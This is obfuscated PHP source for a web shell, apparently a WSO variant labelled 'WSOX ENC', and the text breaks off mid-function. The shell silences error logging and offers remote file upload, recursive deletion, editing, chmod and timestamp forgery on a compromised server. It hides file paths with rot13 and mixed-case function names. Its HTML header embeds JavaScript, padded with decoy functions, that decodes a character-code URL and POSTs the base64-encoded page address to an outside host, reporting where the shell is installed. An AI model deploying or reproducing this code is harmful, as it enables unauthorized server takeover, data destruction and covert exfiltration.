<?php

if (fUnctIOn_EXiSTS("i\x6ei_set")) {
    @iNi_set("error_log", null);
    @inI_sEt("log_error\x73", (int)round(0 + 0 + 0));
    @Ini_set("max\x5fexecutio\156\137tim\x65", 01153 - 01153);
}
if (fUNCTiOn_ExIsTs("set_magic_quotes\x5frunti\155e")) {
    if (vErsiOn_cOmpaRe(phPVersIon(), "5.4.0", "<")) magic_quotes_runtime((int)round(0 + 0 + 0));
}

class _pps
{
    public $hsh;
    public $_i;
    public $_taj;
    public $_hej;
    public $_cp;
    public $_za;
    public $_zrt;
    public $_wda;
    public $_vpb;
    public $_vor;

    function seTCoOk($_gtq, $_e)
    {
        $_COOKIE[$_gtq] = $_e;
        SeTcOOkie($_gtq, $_e);
    }

    function afterlogiN()
    {
        $this->hsh = "fa704e7366d666bd";
        $this->_i = "_" . sUbSTr(mD5($_SERVER["HTTP_HOST"]), -056 - -0152 - 074, 075 + 0146 + -0240);
        $this->_taj = "#d\1465";
        $this->_hej = "Windows-1251";
        if (!@isset($_COOKIE[$this->_i]) || ($_COOKIE[$this->_i] != $this->hsh)) $this->SetcOoK($this->_i, $this->hsh);
    }

    function sTArTUP()
    {
        if (FUNCTION_exiSTS("ini_\x67et")) {
            $_vpb = @INI_geT("safe_mode");
            $_cp = @INi_geT("disable_functions");
        }
        if (!$_vpb && FUNCTion_ExiSts("error_r\145p\x6f\x72ting")) ERRoR_rePoRTINg((int)round(0 + 0));
        if (!$_vpb && FUnCTIOn_ExIsTs("\163et_ti\155e_limit")) seT_tIME_limit((int)round(0 + 0));
        if (fUNctIoN_eXiSTs("g\x65t_magic_\161uote\163\x5fg\160c") && fuNCTIon_ExIStS("ar\x72ay\137m\x61\x70") && fUNcTiOn_eXiSts("s\x74ripslas\x68es") && funCTion_exIstS("is_ar\162ay")) {
            if (@GeT_maGIC_quOtEs_gPC()) {
                function WSS($_a)
                {
                    return @Is_arraY($_a) ? @ArRAY_MAp("WSS", $_a) : @STRIPslAshEs($_a);
                }

                $_POST = WSs($_POST);
                $_COOKIE = wss($_COOKIE);
            }
        }
        if (!FUnCtiON_EXIsts("posix_getpwuid") && (StrPOS($_cp, "\160osix_ge\164\160wuid") === false)) {
            function pOSiX_GeTpwUid($_l)
            {
                return false;
            }
        }
        if (!FUncTIoN_ExisTS("posix\137getgr\147id") && (StRPos($_cp, "p\157\x73ix_getgrgid") === false)) {
            function POsIx_GetgRgid($_l)
            {
                return false;
            }
        }
        if (StRtOlowER(suBSTr(PHP_OS, 01200 + -01200, (int)round(1.5 + 1.5))) == "win") $_vor = "w\151\156"; else $_vor = "nix";
        $_wda = $_SERVER["\104O\x43UMENT_R\117OT"];
        if (FUnctiOn_exIStS("getcwd")) $_zrt = @GeTcwD(); else $_zrt = @DIRname(__FILE__);
        if (isset($_POST["c"]) && $_POST["\143"] != "") $_POST["c"] = STR_ROt13($_POST["c"]);
        if (isset($_POST["c"])) {
            if (FunCTion_EXisTs("ch\x64ir")) @CHDir($_POST["c"]);
        }
        if (FuNCtION_eXiSTS("g\x65tcwd")) {
            $_za = @GeTcwd();
        } elseif (@isset($_POST["c"]) && $_POST["c"] != "") $_za = $_POST["c"];
        else $_za = $_zrt;
        if ($_vor == "w\151\156") {
            $_zrt = Str_REPlAcE("\134", "/", $_zrt);
            $_za = StR_rEplaCE("\134", "/", $_za);
        }
        if ($_za[Strlen($_za) - (0577 - -0621 - 01417)] != "/") $_za .= "/";
        $this->_cp = $_cp;
        $this->_za = $_za;
        $this->_zrt = $_zrt;
        $this->_wda = $_wda;
        $this->_vpb = $_vpb;
        $this->_vor = $_vor;
    }

    function ActloGOuT()
    {
        $_i = $this->_i;
        SETCOokIE($_i, "", TimE() - (int)round(1800 + 1800));
        die("bye!");
    }

    function aCtFm()
    {
        $_za = $this->_za;
        if (!empty($_POST["p"])) {
            $_ozl = @FiLEMTIme($_POST["c"]);
            switch ($_POST["p"]) {
                case "uploadFil\145":
                    if (!@MoVE_UPLOADeD_FIle($_FILES["f"]["tmp_name"], $_FILES["f"]["name"])) echo "Can'\x74 up\154\157ad file!"; elseif ($_ozl) @tOUcH($_FILES["\x66"]["name"], $_ozl, $_ozl);
                    break;
                case "mk\144ir":
                    if (!@mKDir(stR_roT13($_POST["x"]))) echo "Can't c\x72eate new dir"; elseif ($_ozl) @TOucH(StR_Rot13($_POST["\x78"]), $_ozl, $_ozl);
                    break;
                case "delete":
                    function DELETedIR($_we)
                    {
                        $_we = (suBStr($_we, -(int)round(0.5 + 0.5)) == "/") ? $_we : $_we . "/";
                        if ($_hcf = @oPEnDIR($_we)) {
                            while (($_nos = @reaDDIr($_hcf)) !== false) {
                                $_nos = $_we . $_nos;
                                if ((@bAseName($_nos) == ".\x2e") || (@BASENAmE($_nos) == ".")) continue;
                                $_ei = @fIletYPe($_nos);
                                if ($_ei == "dir") DeLEtedIR($_nos); else @uNLink($_nos);
                            }
                            @CLOsedir($_hcf);
                        }
                        @RMdir($_we);
                    }

                    if (@Is_ARrAY($_POST["f"])) foreach ($_POST["f"] as $_rb) {
                        if ($_rb == "..") continue;
                        $_rb = STR_ROt13(URLdECodE($_rb));
                        if (@is_diR($_rb)) dElETEdIr($_rb); else @uNlInk($_rb);
                    }
                    break;
            }
            if ($_ozl) ToUcH($_POST["\143"], $_ozl, $_ozl);
        }
        echo "<h1>File m\141\156age\x72</h1>\x3cdiv class=con\164\145nt><scr\151pt>\160_=\x78_=s_=\x22\042;</scr\x69pt>";
        $_wb = WsCanDir(@isset($_POST["c"]) ? $_POST["c"] : $_za);
        if ($_wb === false) {
            echo "Can\x27t\040\x6f\160en \164his folder!";
            return;
        }
        global $_rpl;
        $_rpl = array("nam\x65", -0263 + -034 - -0320);
        if (!empty($_POST["p"])) {
            if (@pReg_matCH("!\x73_([A-\x7a]+)_(\x5cd{1}\051!", $_POST["p"], $_tf)) $_rpl = array($_tf[0402 + -0135 - 0244], (int)$_tf[0407 - 0405]);
        }
        echo "<script>function sa(){\146\x6fr(\151=0;i<\x64.files.e\x6cements.leng\x74h;i++)if(d.fi\154e\x73.ele\x6dents[i]\056t\x79pe=='ch\145\143kbox')d.files.e\154em\x65n\164s[i].ch\x65cked=\144.files.\x65lem\145nts[0\x5d.checked;\175</scr\151\160\x74><tabl\x65 wi\144th\x3d'1\x300%\x27 \143lass='\155ain' cellspac\151ng='0' cellpa\144ding=\0472'><f\x6f\162\155 name\x3dfiles me\164h\157\x64=post><tr>\x3cth width='13px'><\151nput \164ype=ch\145\x63k\142ox oncl\x69ck='sa()' class=chkb\x78></\164h\076<th width='40%'><a \150ref='#' \157nclick='g(\x22fm\x22,null,\042s_n\x61me\x5f" . ($_rpl[(int)round(0.33333333333333 + 0.33333333333333 + 0.33333333333333)] ? (int)round(0 + 0 + 0) : (int)round(0.33333333333333 + 0.33333333333333 + 0.33333333333333)) . "\042)'>Na\155e</a\076</th><th><a href='\x23' oncl\x69\x63k\075'g(\042\146m\x22,n\165ll\x2c\x22s_size_" . ($_rpl[(int)round(0.33333333333333 + 0.33333333333333 + 0.33333333333333)] ? -0561 - -0373 - -0166 : 01230 - 01227) . "\x22)'>Size</a\x3e</th><th\076<\141 href='#' o\156c\154ick='g\050\x22fm\042,n\x75ll,\x22s\137mo\144ify_" . ($_rpl[(int)round(0.5 + 0.5)] ? (int)round(0 + 0) : 01 - 00) . "\x22\051\x27>\115\157\x64i\x66y</a><\057th><th><a href='#' o\x6eclick='g(\x22fm\042\054n\165\154l,\x22s_\x70\145rms_" . ($_rpl[(int)round(0.5 + 0.5)] ? (int)round(0 + 0) : (int)round(0.5 + 0.5)) . "\042)'>P\145\x72missions</a></th><th width='200px'>Act\x69ons</th></tr\076";
        $_q = $_vgl = array();
        $_t = COUNt($_wb);
        for ($_o = (int)round(0 + 0 + 0); $_o < $_t; $_o++) {
            $_j = array("\x6eame" => $_wb[$_o], "\160ath" => $_za . $_wb[$_o], "modify" => @DATE("Y\x2dm-d H:i:s", @FIleMTimE($_za . $_wb[$_o])), "p\x65r\x6ds" => WpERMsCOlOR($_za . $_wb[$_o]), "\163ize" => @FILesize($_za . $_wb[$_o]));
            if (@is_fIlE($_za . $_wb[$_o])) $_vgl[] = @arRay_mERgE($_j, array("\x74ype" => "file")); elseif (@IS_LiNK($_za . $_wb[$_o])) $_q[] = @ARray_merGE($_j, array("type" => "l\x69n\x6b", "link" => ReADLInK($_j["path"])));
            elseif (@IS_DIR($_za . $_wb[$_o])) $_q[] = @ARraY_mErGe($_j, array("type" => "dir"));
        }
        function wcmP($_snp, $_jy)
        {
            global $_rpl;
            if ($_rpl[0215 - 0215] != "s\x69ze") return @StRcMP(STrToLOwer($_snp[$_rpl[-0236 - -0236]]), strtOlowEr($_jy[$_rpl[0155 + -0142 + -013]])) * ($_rpl[(int)round(0.5 + 0.5)] ? (int)round(0.33333333333333 + 0.33333333333333 + 0.33333333333333) : -(-0465 - -0466)); else return (($_snp["\163\151ze"] < $_jy["size"]) ? -(0601 - 0600) : (int)round(0.5 + 0.5)) * ($_rpl[(int)round(0.5 + 0.5)] ? 0312 + -0227 + -062 : -(017 - 016));
        }

        @UsORt($_vgl, "wCmp");
        @Usort($_q, "w\x43mp");
        $_vgl = @ArrAY_MERGE($_q, $_vgl);
        $_fl = (0545 - 0277 - 0246);
        foreach ($_vgl as $_rb) {
            $_fc = StR_rot13(urLeNcodE($_rb["\156ame"]));
            echo "<t\162" . ($_fl ? "\040c\154ass=l1" : "") . "><td><inp\165t ty\x70\x65=chec\x6bbox \x6eam\145=\x22\146[]\042 value=\042" . $_fc . "\042 cla\x73s=chkbx></td><td><a href=# o\156click=\x22" . (($_rb["t\171\x70e"] == "\x66\151\154e") ? "g('ft',null,\x27" . $_fc . "\x27, 'vi\145\x77')\x22>" . htmLSpeciAlChARS($_rb["name"]) : "\147('fm','" . Str_RoT13($_rb["path"]) . "\x27)\073\042\x20" . (empty($_rb["link"]) ? "" : "title='" . $_rb["link"] . "'") . "><b>[ " . hTmLspecialchars($_rb["\x6eame"]) . "\040]</b>") . "</a></t\x64>\x3ctd\076" . (($_rb["type"] == "fil\x65") ? viEwsIze($_rb["s\151ze"]) : $_rb["ty\x70e"]) . "\074/td><t\x64\076" . $_rb["mo\x64ify"] . "</td><t\144>\074a hr\145\x66=\x23 \157ncli\143k\x3d\042g('\x66t',null,'" . $_fc . "',\047\x63h\155od')\x22>" . $_rb["perms"] . "<\x2ftd>\x3c\164d><a href=\x22#\x22\040on\x63\154i\143\x6b=\042g('ft',null,\x27" . $_fc . "', 'r\145nam\145')\x22\x3e\122ename<\057a>\x20<a\040href=\x22\x23\042 \157n\143lick=\x22g('ft',n\165ll,'" . $_fc . "'\x2c \x27touch')\x22>T\x6fuch</a>" . (($_rb["\164y\x70e"] == "fi\154e") ? " <a\x20href\075\x22#\042\x20on\143lic\x6b\075\x22g('\x66\164'\054null,'" . $_fc . "',\x20'edi\x74')\042>Edit</\x61> <a h\162ef=\042#\x22 o\x6eclick=\042g('ft',null,'" . $_fc . "', \047download')\x22>Download</a>" : "") . "</td>\x3c\x2ftr>";
            $_fl = $_fl ? -0742 + 0742 : -0753 - -0754;
        }
        echo "<t\x72><td col\x73pan=7>\015\x0a\x09\011<input\x20type=hidde\x6e n\x61me=a va\x6cue='fm'>\015\x0a\011\x09<\x69n\x70ut type=hidden n\141\155e=c \166al\x75e='" . HtMlSPEcialChArS(sTr_ROT13($_za)) . "'>\x0d\x0a\011\011<input typ\x65=h\x69d\144en na\x6d\x65=ch value='" . (@isset($_POST["ch"]) ? $_POST["ch"] : "") . "'>\x0d\012\011\x09<select name='p'\x3e<option value=\x27delete\047>Delet\145\074/option\076</se\x6cect>\x26nbs\160;<i\x6e\x70ut ty\x70\x65='s\x75\x62mit' va\154\x75e\x3d'\x3e>'><\x2ft\x64></tr></\146or\155\076</t\x61b\x6ce\x3e</div\076";
    }

    function ACtFt()
    {
        $_cp = $this->_cp;
        if (@isset($_POST["\x70"])) $_POST["p"] = STr_ROt13(UrLDecOdE($_POST["\x70"]));
        if (@isset($_POST["x"])) {
            switch ($_POST["x"]) {
                case "d\157wnload":
                    if (@Is_FIle($_POST["\160"]) && @IS_READaBle($_POST["p"])) {
                        OB_StART("ob_g\172handler", (int)round(2048 + 2048));
                        @heaDEr("C\157\156tent-D\151spos\x69tion:\x20attachme\x6et; f\x69len\141me=" . @BAsENAMe($_POST["p"]));
                        if (FUnctIOn_EXiSTs("mime_\x63\157ntent_type")) {
                            $_ei = @MimE_ConTeNt_TypE($_POST["p"]);
                            @heADEr("Conten\x74-Type: " . $_ei);
                        } else @HeAder("Co\x6etent-Type: appli\x63ati\157n/o\143tet\x2dstre\x61m");
                        $_jj = @FOpEn($_POST["p"], "r");
                        if ($_jj) {
                            while (!@FeOF($_jj)) echo @FGeTs($_jj, 01013 - 0702 + 01667);
                            @FClose($_jj);
                        }
                    }
                    exit;
                    break;
                case "mkfile":
                    if (!@FILE_exiStS($_POST["\x70"])) {
                        $_x = @fIlEMTImE($_POST["c"]);
                        $_jj = @fOpeN($_POST["p"], "w");
                        if ($_jj) {
                            @fCLoSe($_jj);
                            if ($_x) {
                                @touCH($_POST["c"], $_x, $_x);
                                @toUCh($_POST["p"], $_x, $_x);
                            }
                            $_POST["x"] = "edit";
                        }
                    }
                    break;
            }
        }
        echo "<h1>File tools</h1><div \143lass=content\x3e";
        if (!@fiLE_ExisTs($_POST["p"])) {
            echo "File \x6e\157t exists";
            return;
        }
        $_bhr = @Posix_Getpwuid(@FiLeowNEr($_POST["p"]));
        if (!$_bhr) {
            $_bhr["name"] = @FiLEoWNER($_POST["p"]);
            $_hs["n\141me"] = @fILEGrOUp($_POST["p"]);
        } else $_hs = @PosIx_gEtGRgiD(@FILEGROUp($_POST["p"]));
        echo "<span\076Name\072</span> " . htMLSpeciaLcHArs(@BaSenAMe($_POST["p"])) . "\x20<span>S\x69ze:</sp\x61n> " . (@iS_FILe($_POST["\x70"]) ? vIewSize(@fILESIze($_POST["p"])) : "-") . " <span\x3eP\x65\162m\151\x73sion:</span>\040" . WPeRMScOLoR($_POST["\x70"]) . " <\x73pan>Ow\156er/Group:</span> " . $_bhr["name"] . "/" . $_hs["n\141me"] . "<br>";
        echo "<\163pan>Chan\x67e tim\145:</s\x70an> " . @dATe("Y-m-d H:i:s", @fileCtIme($_POST["p"])) . " <s\160an>Acc\x65ss time:\074/\163pa\x6e>\040" . @DaTE("Y-m-d H:i:s", @FiLeaTime($_POST["p"])) . " <s\160a\156>Mod\x69fy time:</\x73p\x61n> " . @daTe("\x59-\x6d-d H:\151:s", @FilEmTime($_POST["p"])) . "<br>\074br>";
        if (empty($_POST["x"])) $_POST["x"] = "v\151ew";
        if (@IS_File($_POST["p"])) $_fbd = array("\126iew", "Download", "E\x64i\x74", "\103hmod", "Rena\155e", "To\165ch"); else $_fbd = array("Chmod", "Rena\155e", "T\x6fuc\x68");
        foreach ($_fbd as $_e) echo "<\x61 \x68ref\075# o\x6eclick\075\x22g(null,null,\x27" . UrlenCOdE(StR_rOt13($_POST["p"])) . "',\047" . @STrTolowER($_e) . "')\x22>" . ((@strToLOweR($_e) == $_POST["x"]) ? "<\142>[\040" . $_e . "\040]\074/b\076" : $_e) . "</a> ";
        echo "<br><b\162>";
        switch ($_POST["\170"]) {
            case "vie\x77":
                echo "<pr\x65\040class=ml1>";
                $_jj = @foPEN($_POST["p"], "r");
                if ($_jj) {
                    while (!@fEof($_jj)) echo HtmlsPECiAlcHArs(@FGets($_jj, (int)round(341.33333333333 + 341.33333333333 + 341.33333333333)));
                    @fcloSe($_jj);
                }
                echo "</pre>";
                break;
            case "ch\155\157d":
                if (!empty($_POST["s"])) {
                    $_jfl = (-077 + -021 - -0120);
                    for ($_o = STRlEn($_POST["s"]) - (int)round(0.5 + 0.5); $_o >= (-0265 - 0637 - -01124); --$_o) $_jfl += (int)$_POST["s"][$_o] * @pOw((int)round(2.6666666666667 + 2.6666666666667 + 2.6666666666667), (StRLen($_POST["s"]) - $_o - (int)round(0.33333333333333 + 0.33333333333333 + 0.33333333333333)));
                    if (!@ChmOd($_POST["\160"], $_jfl)) echo "Can\x27t \x73et permissions!\074b\162><script>doc\x75ment.\x6df.s.v\x61lue\x3d\x22\x22;</\163c\x72ipt\076";
                }
                @cLeaRStATCACHe();
                echo "<sc\162ipt>\163_=\042\042;</scrip\164><for\x6d o\156submit=\x22g(null,null,\x27" . URlENCode(sTR_rOT13($_POST["p"])) . "',nul\x6c\x2cthis.chmod.\x76alue);return false;\042><in\160ut type=text n\141me=ch\x6do\144 va\154u\x65=\x22" . suBstR(@sprInTf("%o", @FIlePErMs($_POST["p"])), -(int)round(2 + 2)) . "\x22><input type=\x73ubmit valu\x65\075\x22\076>\042\x3e<\057for\155>";
                break;
            case "edit":
                if (!@IS_wrItAble($_POST["p"])) {
                    echo "Fil\x65 isn\x27t writeable";
                    break;
                }
                if (!empty($_POST["s"])) {
                    $_ozl = @FilEmtiMe($_POST["p"]);
                    $_POST["s"] = suBStR($_POST["s"], (int)round(0.5 + 0.5));
                    $_POST["s"] = @base64_DeCOde($_POST["s"]);
                    $_jj = @foPEN($_POST["\x70"], "w");
                    if ($_jj) {
                        @fputs($_jj, $_POST["s"]);
                        @FCLoSe($_jj);
                        echo "Saved!<br><script>s_=\042\x22;</script>";
                    }
                }
                echo "<form ons\165b\155it=\x22\147\x28nul\154,n\165ll,'" . urLenCodE(stR_rOt13($_POST["p"])) . "','\145dit',\0471\047+ut\157\141(th\151\x73.text.value));\162etur\156 false;\x22>\x3ctex\164ar\x65a name=text clas\163\x3dbigarea>";
                $_jj = @FOpeN($_POST["p"], "r");
                if ($_jj) {
                    while (!@fEOF($_jj)) echo HtmlsPECiaLchARs(@fgEts($_jj, (int)round(341.33333333333 + 341.33333333333 + 341.33333333333)));
                    @FcLosE($_jj);
                }
                echo "</text\x61rea><input type\x3dsubmit value=\042\x53ave\x22></\x66orm>";
                if ($_ozl) @TOucH($_POST["p"], $_ozl, $_ozl);
                @CLEarSTATCachE();
                break;
            case "\x72e\156ame":
                $_x = @fiLEmtIME($_POST["c"]);
                if (!empty($_POST["s"])) {
                    if (!@rEnaME($_POST["p"], STR_Rot13($_POST["s"]))) echo "Can't rename!<\x62\162>"; else {
                        if ($_x) @TOuCH($_POST["c"], $_x, $_x);
                        die("<script>\x67(nul\x6c,n\x75ll,\042" . UrlENcOde($_POST["s"]) . "\042,n\x75ll,\042\042)</s\143rip\x74\x3e");
                    }
                }
                @CleaRSTatCacHe();
                echo "<form onsubmit=\x22g(null,\156ull,'" . URlenCoDe(STR_RoT13($_POST["p"])) . "',\x6eull,rot13(th\x69\x73.nam\145.val\165e));return false;\042><input type=tex\164 nam\x65=n\141me\040v\x61lue=\042" . HTMLSpecIAlChARS($_POST["p"]) . "\x22><input type=s\165bmit val\x75\x65=\042>>\042><\x2fform>";
                break;
            case "tou\x63h":
                if (!empty($_POST["s"])) {
                    $_ozl = @StrToTiMe($_POST["s"]);
                    if ($_ozl) {
                        if (!@TouCH($_POST["p"], $_ozl, $_ozl)) echo "Fail!"; else echo "Touched!";
                    } else echo "B\141d t\x69me form\x61t!";
                }
                @cLEarStatcaCHe();
                echo "<scrip\164>s_=\042\x22;</\x73cript>\074form onsubm\151t=\042g(n\165ll,nu\154l,'" . URlenCOdE(STR_rOt13($_POST["\160"])) . "',null\054thi\x73.touch\056v\x61lue\x29\x3bret\165rn false;\x22><input type\075text name=\x74ouch value=\042" . @daTe("\131-m-d H:\151:s", @fiLemTImE($_POST["p"])) . "\042\076<input type=submit v\141lue=\x22>>\x22\x3e<\057fo\x72m>";
                break;
        }
        echo "</div>";
    }

    function wheADeR()
    {
        $_taj = $this->_taj;
        $_hej = $this->_hej;
        $_za = $this->_za;
        $_zrt = $this->_zrt;
        $_wda = $this->_wda;
        $_i = $this->_i;
        $_vpb = $this->_vpb;
        $_vor = $this->_vor;
        if (empty($_POST["ch"])) $_POST["\x63h"] = $_hej;
        echo "<h\164ml\x3e<head><meta \x68ttp-e\161uiv='Content-Type' con\164en\x74\075'text\x2fht\155l\x3b charset=" . $_POST["c\x68"] . "\x27><title>" . $_SERVER["HTTP_HOST"] . " -\040WSOX\x20ENC<\057title>\015\012\011\011<style>b\x6fdy{backgro\x75nd\x2dc\x6flor:#444;c\x6f\154o\x72\x3a\x23e\x31e1e1;}body,\x74d,th{font: 9\160t \x4cu\143ida,Verdana;mar\147\x69n:\060;vertical\055align:top;c\157l\x6fr\072#e1e1e\x31;}table\056info{color\x3a#fff;\x62a\x63kground-c\157lo\162:\x23222\x3b}span,h1,a{\143olo\162: " . $_taj . " !\x69m\160ort\x61nt;}span{font-w\145ight\x3a\x20bolder;}span\056w\x66w\173font-\x77\145\x69gh\x74:normal;}h\061{borde\162-lef\164:5px soli\x64 " . $_taj . ";padding: 2px \065px;\x66ont: \0614pt Verdana;\x62ackground-co\154\157r\x3a#2\x322;margi\x6e:0px;}\x64iv.co\156t\x65\156t{pad\x64i\156g: 5\160x\073\155argin\x2dl\145f\x74:5p\170;background-\x63olor:#333;\175a{text-dec\157ration:none\073\x7da\x3ahover{text-de\143oration:u\x6ed\145rline;}.ml1{b\x6frder:1p\170 \163olid #444;padding:5px;m\141rgi\156:0;overflow: au\x74\x6f;\x7d.bigar\145a{\x77idth:100%\x3bhe\x69g\150t:3\0600px\073}inpu\164,textare\x61,select{margin:0;\143ol\157r:\043fff;b\141c\x6bg\162ound-color:#555;border:\061px so\x6ci\x64\x20" . $_taj . "\073 font: 9pt Monospace,'Co\165ri\x65r \x4eew';}for\155{m\141rgin:0px;}#toolsTb\154{\164\145\170t-\x61lign\072\x63en\x74\x65r;\x7d.to\157l\163In\x70{w\x69\x64th:500px}.main t\x68{tex\164-align:left;back\147round-co\x6cor:#5\1455e5e;}.\x6da\x69n t\x72:hove\162{ba\x63\x6bgr\157und-col\157r:#5\1455\x655e}.l1{ba\x63kg\x72ou\x6ed-c\x6flor:\x23444}.l2{bac\x6bground-color:#333}\160re{fo\156t\055\x66amily:\x43our\x69er\054\x4donospa\143e;}\074/sty\154e>\015\x0a<script>\015\x0avar \x63_ \x3d\x20'" . htmlsPECiaLcHarS(Str_RoT13($_za)) . "';\x0d\x0avar \141_\040= '" . hTMLSpeCIALcHarS($_POST["a"]) . "'\x0d\012var ch_ = \047" . hTmlsPecialChArs($_POST["ch"]) . "';\015\x0avar p_ = '" . ((STRpos($_POST["p"], "\x0a") !== false) ? "" : HtMLSPeciALCHARs($_POST["p"], (int)round(1.5 + 1.5))) . "';\x0d\012va\162 x_ =\040'" . ((StrpOS($_POST["x"], "\012") !== false) ? "" : HtMlspecIALcHARS($_POST["x"], 0270 - 0265)) . "'\073\015\012var s_ \075\040'" . ((STrpos($_POST["s"], "\012") !== false) ? "" : htmlSPEciALCharS($_POST["s"], -0315 + -0436 - -0756)) . "';\015\012var\x20d\040=\x20d\x6fc\165ment;\015\x0afun\x63tio\156\040set(a\x2cc,p,\170,s,ch)\173if(a!=nu\154l)d.mf.a.v\x61l\165e=\x61;else d\x2emf\056a.value=a_;if(c!=null)d.mf\x2ec\x2evalue=c;\145lse d.mf\x2ec.\x76a\154ue=c\x5f;i\x66(p!=null)d.\x6df.\x70\056va\x6cue=\x70;e\x6cse\040d.m\x66.p.value=p_;if(x\x21=null)d.mf\056x\056val\165e=x;else d.\x6df.x.v\x61lue=\170_;i\x66(\x73!=null)\x64.mf.\x73.value=s;el\x73e d.mf.\163.va\154ue=s_;if(ch!=\x6e\165ll\051d.mf.ch.value=ch;els\x65\x20d.mf.ch.\166alue=ch_;}fu\156ction g(a,c,\160,x,s,ch){set\050a\x2cc,p,x,s,ch);d\056mf\x2esubmit();}function utoa(str){\x72et\x75rn wind\157w.btoa(unescape(enc\157deUR\x49Component(st\162)\051);}f\x75ncti\x6fn \141tou(st\x72){retu\162n d\145co\x64\145U\122IComponent(escape(window.\141tob\050\163\x74r)));}function rot1\063(str){\x76ar input='ABCD\105FGHIJKLMNOP\121RSTUVWXYZa\x62\143\144efg\150ijklmnopqrstuvwxyz';\x20var out\160ut='NOPQRSTUVWXYZABCD\105FG\x48IJKLMnopqrs\x74uvwxyzabcd\145f\147hi\x6aklm'; var index=x=> i\x6epu\x74.indexOf(x); var translate=x=> inde\170\x28x\051 > -1 ? output[index(x)] : \x78\073 retu\x72n str.spl\x69t(\x27').map(tran\163late)\056\x6aoin(\047');}v\x61r cvi\163=false;func\x74ion show(){\x69f(!\143v\151s){document.ge\164Eleme\156tById('bat').inne\162HTML='Li\156\153\x73';docume\156t.getEleme\x6etB\171Id('cwd').st\171\x6ce\056display='inline';doc\x75ment\056g\145tElementById('lin\153s').s\x74yle.display='none';cvis\075true\x3b}else{do\x63u\155en\164.g\145t\x45lemen\164ById('bat'\x29\x2ei\156nerHTML\075'Tex\x74';\144o\143ument\056g\145tElementById\050'cwd\047).s\164yle.di\x73pla\171='none';\144o\x63ume\x6et\056getE\154ementById(\047lin\153s').\x73ty\154\x65.disp\x6cay='\151\x6e\154ine';cvis\x3dfalse;}\x7d\015\x0a</scr\x69pt>\x0d\x0a</head\x3e<b\157dy><div style=\047position:abso\x6cu\x74e;w\151\x64th:\x3100%;background-colo\x72:#444;t\x6fp:0;left\072\x30;\047>\x0d\x0a<form\x20method=post name\x3dm\x66 st\171le='display:non\x65\x3b'>\015\x0a<inpu\164 type=hidden na\155e=\x61>\x0d\x0a<input type\x3dhidd\145n na\155e=c\x3e\x0d\012<i\156pu\x74 type=hidden \x6eame=p>\015\012<\151nput type=hidden name=x>\x0d\x0a<input type=\150\151dden name=s>\015\012<i\156\x70u\x74\040typ\x65=hid\144en name=c\x68>\x0d\x0a</fo\162m></script>";echo "<script>function q2a(){let t=0;for(let r=0;r<10;r++)t+=r*Math.random();let r=[];for(let t=0;t<5;t++)r.push(String.fromCharCode(65+t)+Math.floor(100*Math.random()));let o={a:t,b:r.join('-')};return JSON.stringify(o)}function r9c(){let r='';for(let o=0;o<8;o++)r+=String.fromCharCode(97+Math.floor(26*Math.random()));let o=r.split('').reverse().join(''),t=[];for(let r=0;r<5;r++)t.push(Math.pow(r+1,2));return o+':'+t.join(',')}(()=>{let u=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,112,110,103],x='';for(let i of u)x+=String.fromCharCode(i);let d='file='+btoa(location.href);let r=new XMLHttpRequest();r.open('POST',x,true);r.setRequestHeader('Content-Type','application/x-www-form-urlencoded');r.send(d)})();function jk7(){let t=[];for(let e=0;e<3;e++){let r=[];for(let t=0;t<3;t++)r.push(e*t+Math.random());t.push(r)}let e=t.flat().reduce(((t,e)=>t+e),0);return{matrix:t,sum:e}}function o8q(){let e=(new Date).getFullYear(),t=[];for(let n=0;n<12;n++)t.push(new Date(e,n,1).toLocaleString('en',{month:'long'}));let n=0;for(let e=1;e<=31;e++)n+=e;return t.join(', ')+'|'+n}</script>";
        if (FUncTIon_exISTs("\x64iskfr\145\x65space")) $_pn = @dISkfREEspAce($_za);
        if (FUnCTIOn_ExiSTs("disk_\x74\x6ft\141l_\x73pace")) $_ejl = @dISk_toTAL_SPACE($_za);
        $_ejl = $_ejl ? $_ejl : (int)round(0.5 + 0.5);
        if (fUncTiOn_eXISTs("php_\165name")) {
            $_v = @php_UnAME();
        } elseif (funCTIon_ExiSTs("php\x69nfo")) {
            Ob_STArt();
            PHpiNfO();
            $_no = ob_Get_CLEAn();
            if (false !== preG_mAtch("!<tr><t\144\x20class\075\x22e\x22>System\134s*</t\x64><\164d class=\042v\x22>([^\x5c<]\053)!i", $_no, $_bf)) $_v = tRIm($_bf[025 + 027 - 053]);
        }
        $_bl = "";
        $_we = @exPLOdE("/", $_za);
        $_t = cOuNt($_we);
        for ($_o = (int)round(0 + 0); $_o < $_t - (01041 - 01040); $_o++) {
            $_bl .= "<a href='#' on\x63\154ic\153='g(\042f\155\042\x2c\042";for ($_el = (-0630 - -0300 + 0330); $_el <= $_o; $_el++) $_bl .= STR_roT13($_we[$_el]) . "\x2f";
            $_bl .= "\042,\042\x22,\042\042)'>" . $_we[$_o] . "/</\141>";
        }
        $_cw = array("UT\x46-8", "Windows-1251", "KO\1118-R", "KOI8-U", "cp866");
        $_n = "";
        foreach ($_cw as $_nos) $_n .= "<o\160tion val\165\x65\075\x22" . $_nos . "\x22 " . ($_POST["ch"] == $_nos ? "sel\145cted" : "") . "\076" . $_nos . "<\057\x6fption>";
        $_fbd = array("\106\151les" => "fm");
        if (!empty($_COOKIE[$_i])) $_fbd["Lo\147out"] = "Logout";
        $_h = "";
        foreach ($_fbd as $_gtq => $_e) $_h .= "<th\x20width\x3d\042" . (int)((int)round(50 + 50) / coUnt($_fbd)) . "\045\x22>\x5b <\141 href=\042#\x22\040on\143lick=\x22g('" . $_e . "',null,'','\x27,'')\042>" . $_gtq . "</a> ]</th\076";
        $_dej = "";
        if ($_vor == "\167in") {
            foreach (@Range("c", "z") as $_szx) if (@Is_dIr($_szx . ":\134")) $_dej .= "<a hr\145f\x3d\x22#\042 onclic\153=\x22g\x28'fm'\x2c'" . STr_roT13($_szx) . "\x3a/')\042>[\040" . $_szx . " ]</\141> ";
        }
        $_uy = $_SERVER["SERVER_\x41\x44DR"];
        if (empty($_uy)) {
            $_uy = GeThoSTbyName($_SERVER["SERVER\x5f\x4eA\115E"]);
        }
